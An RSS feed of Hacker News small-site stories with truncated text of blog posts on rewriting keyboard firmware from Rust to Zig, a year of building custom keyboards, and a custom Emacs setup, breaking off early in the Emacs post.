<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 2]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 2. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Tue, 09 Mar 2021 01:10:57 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-2.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Tue, 09 Mar 2021 01:10:57 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[I rewrote my Rust keyboard firmware in Zig: consistency, mastery, and fun]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26374268">thread link</a>) | @iansinnott
<br/>
March 7, 2021 | https://kevinlynagh.com/rust-zig/ | <a href="https://web.archive.org/web/*/https://kevinlynagh.com/rust-zig/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://kevinlynagh.com/">← Back to Kevin's homepage</a><span>Published: 2021 March 7</span></p><p>I’ve spent the last year <a href="https://kevinlynagh.com/keyboards/">building keyboards</a>, which has included writing firmware for a variety custom circuit boards.</p>

<p>I initially wrote this firmware in Rust, but despite years of experience with that language I still struggled quite a bit.
I eventually got my keyboards working, but it took an embarrassingly long time and wasn’t <em>fun</em>.</p>

<p>After repeated suggestions from my much more Rust-and-computing-experienced friend <a href="https://scattered-thoughts.net/">Jamie Brandon</a>, I rewrote the firmware in <a href="https://ziglang.org/">Zig</a>, which turned out swimmingly.</p>

<p>I found this quite surprising, given that I’d never seen Zig before and it’s a pre-1.0 language written by a <a href="https://twitter.com/andy_kelley">fellow PDX hipster</a> with basically just a <a href="https://ziglang.org/documentation/0.7.1/">single page of documentation</a>.</p>

<p>The experience went so well, in fact, that I now feel just as likely to turn to Zig (a language I’ve used for a dozen hours) as to Rust (which I’ve used for at least a thousand hours).</p>

<p>This, of course, reflects as much about me and my interests as it does about either of these languages.
So I’ll have to explain what I want from a systems programming language in the first place.</p>

<p>Also, to explain why I struggled with Rust I’ll have to show a lot of complex code that I’m obviously unhappy about.
My intent here is not to gripe about Rust, but to establish my (lack of) credibility: It’s so you can judge for yourself whether I’m using Rust’s features in a reasonable way or if I’ve totally lost the plot.</p>

<p>Finally, while it risks falling into the dreadfully boring “language X is better than Y” blog trope, I feel that it’d be more helpful to some readers if I explicitly compare Rust and Zig, rather than write a wholly positive “Zig’s great!” article.
(After all, I’d steadily ignored six months of Jamie gushing about Zig because, “that’s great buddy, but I already know Rust and I just want to get my keyboard done, okay?”)</p>

<h2>What I want from a systems language</h2>

<p>I was educated as a physicist and learned programming so I could make data visualizations.
My first languages were PostScript and Ruby (dynamic, interpreted languages) and I later moved to JavaScript so I could draw on the web.
That led me to Clojure (using ClojureScript to draw on the web), where I’ve spent much of my career.</p>

<p>In 2017 I decided to learn a systems language.
Partly this was intellectual curiosity — I wanted to become more familiar with concepts like the stack, heap, pointers, and static types which had remained mucky to me as a web developer.
But mostly it was because I wanted the capabilities that systems languages promised:</p>

<ol>
<li><p>To write code that was <em>fast</em>; that could take advantage of how computers actually worked and run as fast as the hardware allowed.</p></li>
<li><p>To write applications that could run in minimal environments like microcontrollers or web assembly where it just isn’t feasible (in time or space) to carry along a garbage collector, language runtime, etc.</p></li>
</ol>

<p>My interest was not (and still isn’t) in operating systems, programming language design, or safety (with respect to memory, formal verfiability, modeling as types, etc.).</p>

<p>I just wanted to blink the litle squares on the screen on and off very quickly.</p>

<p>Based on its growing popularity in the open source community and tons of beginners-to-systems-programming documentation, I picked up Rust around version 1.18.</p>

<p>Since then, Rust has undoubtedly helped me achieve those capabilities I was after: I was able to compile it to WASM for a <a href="https://github.com/lynaghk/subform-layout">layout engine</a>, build and sell a <a href="https://keminglabs.com/finda">fast desktop search app</a> (Rust <a href="https://keminglabs.com/blog/building-a-fast-electron-app-with-rust/">shoved into Electron</a>), and compile Rust to an stm32g4 microcontroller to drive a <a href="https://kevinlynagh.com/newsletter/2020_02_robot_update/">track saw robot</a> (I even <a href="https://github.com/stm32-rs/stm32-rs/pull/335">found a typo</a> in the register definitions; the full “hard-mode” embedded debugging experience!).</p>

<p>Despite all this, I still don’t feel <em>comfortable</em> with Rust.
It feels fractally complex — seemingly every time I use Rust on a new project, I run into some issue that forces me to confront a new corner of the language/ecosystem.
Developing my keyboard firmware was no exception: I ran into two problems, and each required learning a completely new language feature.</p>

<p>These problems aren’t really specific to embedded, but they’re representative of the sorts of challenges I’ve run into using Rust over the past three years.</p>

<p>If you want the gory embedded details or understand why I’m writing my own firmware using newfangled languages at all, see my notes on <a href="https://kevinlynagh.com/keyboards/">building keyboards</a>.</p>

<h2>Conditional compilation</h2>

<p>The first challenge I ran into with Rust was getting my firmware to run on hardware varying from 4-button dev-kit PCBs to the left/right halves of a wireless split to a single <a href="https://atreus.technomancy.us/">Atreus</a>:</p>

<p><img src="https://kevinlynagh.com/rust-zig/typical_keyboards.jpg" alt="Various keyboard hardware"></p>

<p>Varying the features of firmware at compile-time is known as “conditional compilation”.
(It needs to be done at compile-time rather than run-time because microcontrollers have limited program space, roughly 10–100kB in my case.)</p>

<p>Rust’s solution to this problem is “features”, which are defined in <code>Cargo.toml</code>:</p>
<div><pre><span></span><span>[dependencies]</span>
<span>cortex-m</span> <span>=</span> <span>"0.6"</span>
<span>nrf52840-hal</span> <span>=</span> <span>{</span> <span>version</span> <span>=</span> <span>"0.11"</span><span>,</span> <span>optional</span> <span>=</span> <span>true</span><span>,</span> <span>default-features</span> <span>=</span> <span>false</span> <span>}</span>
<span>nrf52833-hal</span> <span>=</span> <span>{</span> <span>version</span> <span>=</span> <span>"0.11"</span><span>,</span> <span>optional</span> <span>=</span> <span>true</span><span>,</span> <span>default-features</span> <span>=</span> <span>false</span> <span>}</span>
<span>arraydeque</span> <span>=</span> <span>{</span> <span>version</span> <span>=</span> <span>"0.4"</span><span>,</span> <span>default-features</span> <span>=</span> <span>false</span> <span>}</span>
<span>heapless</span> <span>=</span> <span>"0.5"</span>

<span>[features]</span>
<span>keytron</span> <span>=</span> <span>["nrf52833"]</span>
<span>keytron-dk</span> <span>=</span> <span>["nrf52833"]</span>
<span>splitapple</span> <span>=</span> <span>["nrf52840"]</span>
<span>splitapple-left</span> <span>=</span> <span>["splitapple"]</span>
<span>splitapple-right</span> <span>=</span> <span>["splitapple"]</span>

<span># specify a default here so that rust-analyzer can build the project; when building use --no-default-features to turn this off</span>
<span>default</span> <span>=</span> <span>["keytron"]</span>

<span>nrf52840</span> <span>=</span> <span>["nrf52840-hal"]</span>
<span>nrf52833</span> <span>=</span> <span>["nrf52833-hal"]</span>
</pre></div>
<p>For example, the <code>keytron</code> feature is enabled for a specific keyboard hardware design.
That hardware depends on the <code>nrf52833</code> feature (representing a kind of a microcontroller), which depends on the <code>nrf52833-hal</code> crate (actual code which maps that microcontroller’s peripheral memory addresses to Rust types).</p>

<p>My Rust code can then use attribute annotations to conditionally enable stuff.
E.g., a namespace can import the microcontroller-specific crate:</p>
<div><pre><span></span><span>#[cfg(feature = </span><span>"nrf52833"</span><span>)]</span><span></span>
<span>pub</span><span> </span><span>use</span><span> </span><span>nrf52833_hal</span>::<span>pac</span><span> </span><span>as</span><span> </span><span>hw</span><span>;</span><span></span>

<span>#[cfg(feature = </span><span>"nrf52840"</span><span>)]</span><span></span>
<span>pub</span><span> </span><span>use</span><span> </span><span>nrf52840_hal</span>::<span>pac</span><span> </span><span>as</span><span> </span><span>hw</span><span>;</span><span></span>
</pre></div>
<p>or call the appropriate key scanning routine:</p>
<div><pre><span></span><span>fn</span> <span>read_keys</span><span>()</span><span> </span>-&gt; <span>Packet</span><span> </span><span>{</span><span></span>
<span>    </span><span>let</span><span> </span><span>device</span><span> </span><span>=</span><span> </span><span>unsafe</span><span> </span><span>{</span><span> </span><span>hw</span>::<span>Peripherals</span>::<span>steal</span><span>()</span><span> </span><span>};</span><span></span>

<span>    </span><span>#[cfg(any(feature = </span><span>"keytron"</span><span>, feature = </span><span>"keytron-dk"</span><span>))]</span><span></span>
<span>    </span><span>let</span><span> </span><span>u</span><span> </span><span>=</span><span> </span><span>{</span><span></span>
<span>        </span><span>let</span><span> </span><span>p0</span><span> </span><span>=</span><span> </span><span>device</span><span>.</span><span>P0</span><span>.</span><span>in_</span><span>.</span><span>read</span><span>().</span><span>bits</span><span>();</span><span></span>
<span>        </span><span>let</span><span> </span><span>p1</span><span> </span><span>=</span><span> </span><span>device</span><span>.</span><span>P1</span><span>.</span><span>in_</span><span>.</span><span>read</span><span>().</span><span>bits</span><span>();</span><span></span>

<span>        </span><span>//invert because keys are active low</span>
<span>        </span><span>gpio</span>::<span>P0</span>::<span>pack</span><span>(</span><span>!</span><span>p0</span><span>)</span><span> </span><span>|</span><span> </span><span>gpio</span>::<span>P1</span>::<span>pack</span><span>(</span><span>!</span><span>p1</span><span>)</span><span></span>
<span>    </span><span>};</span><span></span>

<span>    </span><span>#[cfg(feature = </span><span>"splitapple"</span><span>)]</span><span></span>
<span>    </span><span>let</span><span> </span><span>u</span><span> </span><span>=</span><span> </span><span>gpio</span>::<span>splitapple</span>::<span>read_keys</span><span>();</span><span></span>

<span>    </span><span>Packet</span><span>(</span><span>u</span><span>)</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Getting this conditional compilation working required learning a lot of stuff:</p>

<ul>
<li>the attribute annotation conditional mini-language (the <code>any</code> in <code>#[cfg(any(feature = "keytron", feature = "keytron-dk"))]</code>)</li>
<li>the <code>optional = true</code> that must be added to the device crates in <code>Cargo.toml</code> (even though the source is already conditionally requiring them!)</li>
<li>how to enable features when building a static binary (<code>cargo build --release --no-default-features --features "keytron"</code>)</li>
</ul>

<p>I still have many unresolved questions, too!</p>

<p>At some point I gave up trying to pass device peripherals as function arguments because I couldn’t figure out how to add conditional attributes to types — the “obvious” thing doesn’t work:</p>
<div><pre><span></span><span>fn</span> <span>read_keys</span><span>(</span><span>port</span>: <span>#[cfg(feature = </span><span>"splitapple"</span><span>)]</span><span></span>
<span>                   </span><span>nrf52840_hal</span>::<span>pac</span>::<span>P1</span><span></span>
<span>                   </span><span>#[cfg(feature = </span><span>"keytron"</span><span>)]</span><span></span>
<span>                   </span><span>nrf52833_hal</span>::<span>pac</span>::<span>P0</span><span>)</span><span> </span>-&gt; <span>Packet</span><span> </span><span>{}</span><span></span>
</pre></div>
<p>There’s a neat embedded framework, <a href="https://rtic.rs/0.4/book/en/preface.html">RTIC</a>, whose main entry point is an <code>app</code> annotation that takes the device crate as an, uh, argument:</p>
<div><pre><span></span><span>#[app(device = nrf52833)]</span><span></span>
<span>const</span><span> </span><span>APP</span>: <span>()</span><span> </span><span>=</span><span> </span><span>{</span><span></span>
<span>  </span><span>//your code here...</span>
<span>};</span><span></span>
</pre></div>
<p>How does one conditionally vary this argument at compile-time?
I have no idea.</p>

<h2>Types and macros</h2>

<p>Rust also proved challenging even within a single hardware configuration.</p>

<p>Consider scanning a keyboard matrix: If we don’t have enough microcontroller pins to connect each keyboard switch directly to a pin, we can arrange the switches with diodes (one-way valves) into a matrix:</p>

<p><img src="https://kevinlynagh.com/rust-zig/key_matrix.png" alt="circuit schematic of key matrix"></p>

<p>We then set a single column high and read out the the rows to find state of the switches on that column.</p>

<p>In this example, if we set pin 1.10 high (col0) and then read pin 0.13 (row1) as high, we know that switch K8 is pressed.</p>

<p>Pretty simple in theory, but complex in Rust because:</p>

<ol>
<li>Device crates expose hardware peripherals as distinct types</li>
<li>One does not simply compute with distinct types in Rust</li>
</ol>

<p>Say I need to initialize all the columns as output pins.</p>

<p>Doing this for a single pin, say peripheral port P0’s pin 10, is simple enough:</p>
<div><pre><span></span><span>P0</span><span>.</span><span>pin_cnf</span><span>[</span><span>10</span><span>].</span><span>write</span><span>(</span><span>|</span><span>w</span><span>|</span><span> </span><span>{</span><span></span>
<span>    </span><span>w</span><span>.</span><span>input</span><span>().</span><span>disconnect</span><span>();</span><span></span>
<span>    </span><span>w</span><span>.</span><span>dir</span><span>().</span><span>output</span><span>();</span><span></span>
<span>    </span><span>w</span><span></span>
<span>});</span><span></span>
</pre></div>
<p>But my column pins are spread across two ports, so what I <em>want</em> to write:</p>
<div><pre><span></span><span>for</span><span> </span><span>(</span><span>port</span><span>,</span><span> </span><span>pin</span><span>)</span><span> </span><span>in</span><span> </span><span>&amp;</span><span>[(</span><span>P0</span><span>,</span><span> </span><span>10</span><span>),</span><span> </span><span>(</span><span>P1</span><span>,</span><span> </span><span>7</span><span>),</span><span> </span><span>..</span><span>.]</span><span> </span><span>{</span><span></span>
<span>    </span><span>port</span><span>.</span><span>pin_cnf</span><span>[</span><span>pin</span><span>].</span><span>write</span><span>(</span><span>|</span><span>w</span><span>|</span><span> </span><span>{</span><span></span>
<span>        </span><span>w</span><span>.</span><span>input</span><span>().</span><span>disconnect</span><span>();</span><span></span>
<span>        </span><span>w</span><span>.</span><span>dir</span><span>().</span><span>output</span><span>();</span><span></span>
<span>        </span><span>w</span><span></span>
<span>    </span><span>});</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>isn’t going to fly because now the tuples have different types — <code>(P0, usize)</code> and <code>(P1, usize)</code> — and so they can’t hang together in the same collection.</p>

<p>Here’s the solution I came up with:</p>
<div><pre><span></span><span>type</span> <span>PinIdx</span><span> </span><span>=</span><span> </span><span>u8</span><span>;</span><span></span>
<span>type</span> <span>Port</span><span> </span><span>=</span><span> </span><span>u8</span><span>;</span><span></span>

<span>const</span><span> </span><span>COL_PINS</span>: <span>[(</span><span>Port</span><span>,</span><span> </span><span>PinIdx</span><span>);</span><span> </span><span>7</span><span>]</span><span> </span><span>=</span><span></span>
<span>    </span><span>[(</span><span>1</span><span>,</span><span> </span><span>10</span><span>),</span><span> </span><span>(</span><span>1</span><span>,</span><span> </span><span>13</span><span>),</span><span> </span><span>(</span><span>1</span><span>,</span><span> </span><span>15</span><span>),</span><span> </span><span>(</span><span>0</span><span>,</span><span> </span><span>2</span><span>),</span><span> </span><span>(</span><span>0</span><span>,</span><span> </span><span>29</span><span>),</span><span> </span><span>(</span><span>1</span><span>,</span><span> </span><span>0</span><span>),</span><span> </span><span>(</span><span>0</span><span>,</span><span> </span><span>17</span><span>)];</span><span></span>

<span>pub</span><span> </span><span>fn</span> <span>init_gpio</span><span>()</span><span> </span><span>{</span><span></span>
<span>    </span><span>for</span><span> </span><span>(</span><span>port</span><span>,</span><span> </span><span>pin_idx</span><span>)</span><span> </span><span>in</span><span> </span><span>&amp;</span><span>COL_PINS</span><span> </span><span>{</span><span></span>
<span>        </span><span>match</span><span> </span><span>port</span><span> </span><span>{</span><span></span>
<span>            </span><span>0</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span>
<span>                </span><span>device</span><span>.</span><span>P0</span><span>.</span><span>pin_cnf</span><span>[</span><span>*</span><span>pin_idx</span><span> </span><span>as</span><span> </span><span>usize</span><span>].</span><span>write</span><span>(</span><span>|</span><span>w</span><span>|</span><span> </span><span>{</span><span></span>
<span>                    </span><span>w</span><span>.</span><span>input</span><span>().</span><span>disconnect</span><span>();</span><span></span>
<span>                    </span><span>w</span><span>.</span><span>dir</span><span>().</span><span>output</span><span>();</span><span></span>
<span>                    </span><span>w</span><span></span>
<span>                </span><span>});</span><span></span>
<span>            </span><span>}</span><span></span>
<span>            </span><span>1</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span></span>
<span>                </span><span>device</span><span>.</span><span>P1</span><span>.</span><span>pin_cnf</span><span>[</span><span>*</span><span>pin_idx</span><span> </span><span>as</span><span> </span><span>usize</span><span>].</span><span>write</span><span>(</span><span>|</span><span>w</span><span>|</span><span> </span><span>{</span><span></span>
<span>                    </span><span>w</span><span>.</span><span>input</span><span>().</span><span>disconnect</span><span>();</span><span></span>
<span>                    </span><span>w</span><span>.</span><span>dir</span><span>().</span><span>output</span><span>();</span><span></span>
<span>                    </span><span>w</span><span></span>
<span>                </span><span>});</span><span></span>
<span>            </span><span>}</span><span></span>
<span>            </span><span>_</span><span> </span><span>=&gt;</span><span> </span><span>{}</span><span></span>
<span>        </span><span>}</span><span></span>
<span>    </span><span>}</span><span></span>
<span>}</span><span></span>
</pre></div>
<p>Yup, good ol’ copy-paste to the rescue.</p>

<p>But wait, I hear you asking, what about <em>macros</em>?
Oh yes, my friend, I shaved the macro yak in the actual scanning routine:</p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>read_keys</span><span>()</span><span> </span>-&gt; …</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kevinlynagh.com/rust-zig/">https://kevinlynagh.com/rust-zig/</a></em></p>]]>
            </description>
            <link>https://kevinlynagh.com/rust-zig/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26374268</guid>
            <pubDate>Sun, 07 Mar 2021 08:42:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes from a Year of Building Keyboards]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26373951">thread link</a>) | @2mol
<br/>
March 6, 2021 | https://kevinlynagh.com/keyboards/ | <a href="https://web.archive.org/web/*/https://kevinlynagh.com/keyboards/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://kevinlynagh.com/">← Back to Kevin's homepage</a><span>Published: 2021 March 7</span></p><p>The electronics design and fabrication technologies available to motivated individuals today is incredible.
Compared to even just 6 years ago when I <a href="https://kevinlynagh.com/phonetron/">made a cell phone</a>, we amateurs now have access to powerful CAD/CAM, low-cost/qty PCB assembly, sorta-usable free EDA software, powerful new embedded languages, and a huge corpus of tacit knowledge on YouTube.</p>

<p>I’ve spent the last year exploring this frontier by building wireless mechanical keyboards.
I’ve designed a dozen PCBs, written bare-metal microcontroller firmware in three languages, and commissioned or fabricated myself a ton of parts from aluminum, acrylic, Corian, resin, and fabric:</p>

<p><img src="https://kevinlynagh.com/keyboards/keyboards.jpg" alt="A bunch of keyboards"></p>

<p>This page isn’t a tutorial or comprehensive reference on any particular technical topic (though I’ll link to my favorites below).
Rather, it’s a rough diary and reflection on the process.
My hope is that:</p>

<ol>
<li>it gives you a flavor of the overall experience and demystifies the work between “idea” and “functioning prototype”</li>
<li>you’ll discover at least one weird trick that you can apply to your own projects</li>
</ol>

<p>If you have ideas, questions, or think I can help with your creative explorations, feel free to <a href="mailto:kevin@keminglabs.com">send me an email</a>.</p>

<h2>Motivation: Why keyboards?</h2>

<p>I’ll start with a little secret: I don’t care much about keyboards.
Most of my typing is on an 11" Macbook Air from 2013, though my fingers sometimes grace client-provided hardware like Dell laptops, IBM/Lenovo ThinkPads, and newer Macs with those butterfly keyboards that Twitter/HN people got real mad about.
They’re all fine, really.</p>

<p>I first learned of the custom keyboard scene when I convinced a friend to <a href="https://kevinlynagh.com/notes/pricing-niche-products/">sell his keyboards for $1,668</a>, but personally never developed any burning desire to acquire (or bring into existence) a keyboard the way my friend and his fans did.</p>

<p>Rather, keyboards appeal to me as a playground of design constraints and technical challenges:</p>

<ul>
<li><p>Electrically, keyboards can be wired (drawing power and communicating over USB) or wireless, the latter raising issues of power (selecting batteries, charging and load-sharing circuitry, etc.) and communication (to host devices and between halves of a split keyboard).</p></li>
<li><p>Physically, keyboards have functional size constraints (relating to one’s fingers) but are not subject to serious mechanical loads, so a huge variety of materials and designs can be explored for aesthetic qualities (visual look, key feel, typing sound, etc.).</p></li>
<li><p>Functionally, keyboard logic can range from simple “press key for character” behavior all the way to elaborate schemes involving multiple layers, tapping keys, special sequences, and even acting as a computer mouse.
(See the open source <a href="https://beta.docs.qmk.fm/using-qmk/guides">QMK firmware</a> for the more popular tricks.)
In addition to its behavior as an input device, a keyboard might also need to handle activities like Bluetooth pairing, signaling battery status, and blinking lights in amusing ways.</p></li>
</ul>

<p>While these three domains — electronics, physical design/fabrication, and firmware — are all interesting to me on their own, they become even more fascinating combined together.</p>

<p>It’s immensely satisfying, for example, to find optimizations and novel product functionality by synthesizing knowledge across these disciplines:</p>

<ul>
<li>restricting the hardware to a subset of GPIO pins simplifies the firmware, allowing it to run faster and consume less battery</li>
<li>PCBs can function load-bearing mechanical parts</li>
<li>I’d never heard of <a href="https://en.wikipedia.org/wiki/Near-field_communication">NFC</a>, but after discovering it in my microcontroller’s datasheet I was inspired to develop a “type on your phone by tapping it to the keyboard” quick-switching feature</li>
</ul>

<p>As a problem space, keyboards have a “low floor and high ceiling”.</p>

<p>Finally, as a long-time web developer I’m attracted to the minimalism of embedded hardware products.
Application code running in a web browser is subject to the whims of operating system schedulers, JavaScript JITs, and millions of lines of “system” code running underneath.
Working in such a complex environment, it’s easy to develop a learned helplessness around performance, understandability, and even determinism.</p>

<p>While surely some of this is “grass-is-greener” thinking — yes, I’m aware of cosmic rays, bad solder joints, and thermal variation — I’ve found it an enjoyable change of pace to switch from StackOverflow comments and ever-changing dependencies to bare-metal code (mostly mine) running on physical hardware (also mine) that I can power-cycle instantly, documented by 1000-page datasheets which discuss worst-case timing guarantees in microseconds.</p>

<h2>Retrospective overview + timeline</h2>

<p>My <a href="https://kevinlynagh.com/newsletter/2020_04_keyboards_rethinking_desktops/">original product concept</a> was a “split ergonomic travel keyboard”, but I ended up spending far more time on technical pursuits and process development than I did getting a tightly-scoped product out the door.
However, I managed to complete three functional prototypes:</p>

<h3>v1</h3>

<p><img src="https://kevinlynagh.com/keyboards/v1.jpg" alt="V1 keyboard"></p>

<p>My initial focus was on maximally compact mechanical keyboard.
I chose a 5x5 grid (no real reason) of Kailh’s low-profile “Choc” switches and selected components that would fit between the stems of the switches on the PCB backside.</p>

<p>This keyboard involved a lot of personal firsts: Using KiCAD, designing an nRF52-based board and firmware, designing a battery protection and charging circuit (my first use of a P-type MOSFET), drawing footprints for a mid-mount USB connector, etc.</p>

<p>In hindsight I’m amazed it all actually worked on the first revision, and I’m still tickled that I sourced custom, adorable-sized 2 x 13 x 80 mm lithium polymer cells ($200 for 50pcs from <a href="https://www.fentcell.com/">Battsys</a>).</p>

<p>This v1 PCB worked great as a platform on which to develop firmware and refine my understanding of the Bluetooth low energy (BLE) and USB protocols  (as exposed via Nordic Semiconductor’s SDK — I’m not yet ambitious enough to bit-bang the radio antenna myself).</p>

<h3>The “Split Apple”</h3>

<p><img src="https://kevinlynagh.com/keyboards/split_apple.jpg" alt="Split Apple keyboard"></p>

<p>As soon I paired with a computer and actually tried using the v1 split keyboard , I realized I couldn’t be bothered to re-learn how to type on 50 ortholinear keys.
So, for the next iteration, I decided to just split of Apple’s keyboard layout.</p>

<p>Unfortunately, not all the necessary keycap sizes were available for Choc switches, so I had to make this one with taller Cherry MX switches.
Rather than wait ~5 weeks for PCBWay assembly, I designed with parts from JLCPCB’s catalog (~1 week turnaround) and soldered myself the nRF52840 dongle.</p>

<p>Because JLCPCB doesn’t assemble USB connectors, the Split Apple also pushed me to implement wireless charging hardware and over-the-air firmware updates (with associated bootloader stack).</p>

<p>By this point I’d found an sign shop here in Taipei that was happy to same-day laser cut acrylic from PDF drawings, and I relied on them extensively for cheap and fast (about $5 per 150mm laser-cut acrylic part) material mock-ups while prototyping the keyboard’s “PCB + acrylic + acrylic” stack-up construction (an idea I stole from this <a href="https://github.com/PancakeLegend/Keyboards/wiki/MiT-Ortholinear:-Assembly-Guide">PancakeLegend keyboard</a>).</p>

<p>Because of the complexity of its layout (not just a 5x5 grid) and stacked-layer construction, the Split Apple forced me to develop a programmatic process to carry designs from <a href="http://www.keyboard-layout-editor.com/">keyboard-layout-editor.com</a> (of course that’s a thing) to my PCB and mechanical CAD software.
This process came in quite handy for all subsequent work.</p>

<h3>The Atreus</h3>

<p><img src="https://kevinlynagh.com/keyboards/atreus.jpg" alt="Atreus keyboard"></p>

<p><img src="https://kevinlynagh.com/keyboards/bamboo_atreus.jpg" alt="Atreus keyboard"></p>

<p>In November I got access to a desktop CNC mill and immediately started exploring designs using Corian, an artificial stone-like material typically found in fancy kitchen countertops.
I wanted to explore fabricating a small production run (~50 keyboards?) myself, so I machined <a href="https://atreus.technomancy.us/">Phil Hagelberg’s Atreus</a> design as a prototype design, for a few reasons:</p>

<ul>
<li>The keyless area in the middle highlights the Corian material and (internally) provides room for standard-sized lithium polymer batteries (a fallback I wanted in case shipping my custom lil’ ones proved too difficult).</li>
<li>A single-piece keyboard is half the assembly/QA work of a two-piece keyboard.</li>
<li>The Atreus design seemed as good as any other on which to ramp up machining capabilities.</li>
</ul>

<p>The production framing encouraged me to optimize my design for manufacture (minimize the number of setups and endmills), develop fixtures, and really dial in the feeds &amp; speeds to maximize the material removal rate.</p>

<p>To keep the Atreus from slipping around a desk, I also investigated several silicone and polyurethane materials and mold design techniques.</p>

<h3>Timeline</h3>

<ul>
<li>2020 March: Rust “hello world” LED blinking on nRF52 dongle</li>
<li>April: BLE and USB stack running on nRF52 dongle</li>
<li>May: Design and order first custom PCB (v1)</li>
<li>June: While waiting for v1, make <a href="https://kevinlynagh.com/touchpad/">touchpad</a> as an excuse to try JLCPCB’s assembly service</li>
<li>July: Reorganize firmware architecture (have Nordic’s Makefile link to Rust rather than Rust compile Nordic’s code)</li>
<li>August: BLE for split board</li>
<li>Sept: Try to use v1 keyboard, implement layers, keymaps, etc.</li>
<li>Oct: Design full-sized Apple-layout split keyboard and matrix-scanning firmware</li>
<li>Nov: Start pushing on industrial design: laser cut acrylic and metal prototypes, get access to a CNC machine</li>
<li>Dec: Optimize machining and workholding for Corian designs, rewrite firmware in Zig </li>
<li>2021 Jan: Machine Atreus and design its PCB, consider production run, product photography</li>
<li>Feb: Write this retrospective</li>
</ul>

<h2>Materials</h2>

<p>The <a href="https://www.reddit.com/r/MechanicalKeyboards/">r/MechanicalKeyboards</a> subreddit loves anodized aluminum.
Yes, amazing material: lightweight, strong, corrosion resistant, etc., etc.
But also sorta boring — I mean, we can already buy those keyboards at the Apple store!</p>

<p>I’m much more interested in materials like leather, cork, Corian, and fabric.</p>

<p>Finding such materials and related tooling was difficult in the first few months after I moved Taiwan (<a href="https://kevinlynagh.com/newsletter/2020_11_online_retail/">I miss McMaster-Carr</a>), but eventually I managed with a lot of legwork and Google Translate-mediated conversations.</p>

<p>I hoped leather might serve as a non-slip “bottom” that could be stitched around or glued to the v1 PCBs:</p>

<p><img src="https://kevinlynagh.com/keyboards/leather_base.jpg" alt="leather bottom"></p>

<p>however the thick, already stiff leather became brittle after laser cutting (also, the smell!) and wasn’t actually very grippy (I suspect the v1 PCB is simply …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://kevinlynagh.com/keyboards/">https://kevinlynagh.com/keyboards/</a></em></p>]]>
            </description>
            <link>https://kevinlynagh.com/keyboards/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26373951</guid>
            <pubDate>Sun, 07 Mar 2021 07:23:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Custom Emacs Setup]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 3 (<a href="https://news.ycombinator.com/item?id=26373802">thread link</a>) | @todsacerdoti
<br/>
March 6, 2021 | https://hristos.co/blog/my-custom-emacs-setup/ | <a href="https://web.archive.org/web/*/https://hristos.co/blog/my-custom-emacs-setup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
   
   <p><span>Posted: <time id="post-date">2021-03-06</time></span>
   </p>
   <p id="post-excerpt">
    It seems to be widely accepted that creating a powerful, useful Emacs setup "by hand" is just too much trouble, and you should choose a "distro" like Doom Emacs. But is it really all so bad? If you go the route of "hand-made", will you suffer through endless nights of fixing your setup? The answer is: probably not, but read on for more details! <a href="#footnote-1"><sup id="footnote-ref-1">1</sup></a>
   </p>
   
   <h3 id="why-custom-">
    <a href="#why-custom-">→ </a>Why Custom?
   </h3>
   <p>
    I've got a lot of respect for the various Emacs "distros" out there, but my inclination for DIY as well as for understanding my tools keeps me from going that route. I'd rather spend some time reading and researching than running a prefab setup that's effectively a mystery to me.
   </p>
   <p>
    At the end of the day I do spend time on my configuration, but it's hardly the part-time job folks make it out to be. And throughout the years, I've learned a substantial amount about how Emacs actually works.
   </p>
   <p>
    Prefab setups are usually nice until you hit some usability wall, or find a leak in the abstraction. Sometimes, you end up putting as much effort into learning your abstraction as you would have put into just learning the thing you tried to abstract. This is why I'm fine with getting my hands dirty with Emacs.
   </p>
   <h3 id="desired-features">
    <a href="#desired-features">→ </a>Desired Features
   </h3>
   <p>
    Before getting into the details of customizing Emacs, it's good to lay out some goals. This will help keep the project focused and prevent you from bloating your setup with things you don't really need. For me, the list looks something like this:
   </p>
   <ul>
    <li>
     Automated, idempotent setup that can be repeated easily
    </li>
    <li>
     Declaratively install packages
    </li>
    <li>
     LSP support for languages that have a supporting server, powerful autocompletion for those that don't
    </li>
    <li>
     Quality-of-life packages and modes
    </li>
    <li>
     A wealth of custom keybindings to make life better
    </li>
   </ul>
   <p>
    I personally don't need a full-on project management system, or deep IDE-like integration, but indeed all of that is available if you'd want it. Anyways, with these goals in mind, let's begin to discuss implementation.
   </p>
   <h4 id="automatic--idempotent-setup">
    <a href="#automatic--idempotent-setup">→ </a>Automatic, Idempotent Setup
   </h4>
   <p>
